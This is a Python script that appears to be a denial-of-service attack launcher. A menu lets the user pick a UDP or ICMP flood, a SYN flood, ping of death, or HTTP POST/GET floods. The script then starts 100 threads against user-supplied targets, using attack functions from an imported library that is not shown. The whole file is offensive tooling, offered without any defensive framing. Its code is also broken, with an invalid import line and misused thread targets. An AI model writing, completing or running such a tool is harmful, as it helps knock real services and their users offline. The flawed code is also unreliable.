import requests as res
import threading as th
import time
import sys
import os
import lib/test_lib as ty

choices = [1, 2, 3]
Threads = []



try:
    attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n")) #type of attack
    vector = input("target(targets):\n").split(" ") #target
    bye = input("number of bytes: \n").encode() #packet size

    if attack_type == choices[0]:
        volumeBaseAttack = ty.VolumeBasedAttack
        subtype0 = int(input("udp_flooding(1) or ICMP(2)\n"))
        
        if subtype0 == 1:
            udp_floo = volumeBaseAttack.udp_flooding(vector, bye)
            for i in range(100):
                t = th.Thread(target=udp_floo, args=(i,))
                Threads.append(t)
                t.start()
        else:
            ICMP = volumeBaseAttack.icmp(vector, bye)
            for i in range(100):
                t = th.Thread(target=ICMP, args=(i,))
                Threads.append(t)
                t.start()

    elif attack_type == choices[1]:
        protocolAttack = ty.ProtocolAttack
        subtype1 = int(input("Syn_flood(1) or pof(2)\n"))
        if subtype1 == 1:
            Syn_flood = protocolAttack.syn_flood(vector, bye)
            for i in range(100):
                t = th.Thread(target=Syn_flood, args=(i,))
                Threads.append(t)
                t.start()
        else:
            pof = protocolAttack.pof(vector, bye)
            for i in range(100):
                t = th.Thread(target=pof, args=(i,))
                Threads.append(t)
                t.start()

    elif attack_type == choices[2]:
        applicationLayerAttack = ty.ApplicationLayerAttack
        subtype2 = int(input("Post(1) or Get(2)\n"))
        if subtype2 == 1:
            Post = applicationLayerAttack.post(vector, bye)
            for i in range(100):
                t = th.Thread(target=Post, args=(i,))
                Threads.append(t)
                t.start()
                print("using post method to: ", vector)
        else:
            Get = applicationLayerAttack.get(vector, bye)
            for i in range(100):
                t = th.Thread(target=Get, args=(i,))
                Threads.append(t)
                t.start()

    
    for t in Threads:
        t.join()

except KeyboardInterrupt:
    os.system("cls")
    sys.exit()
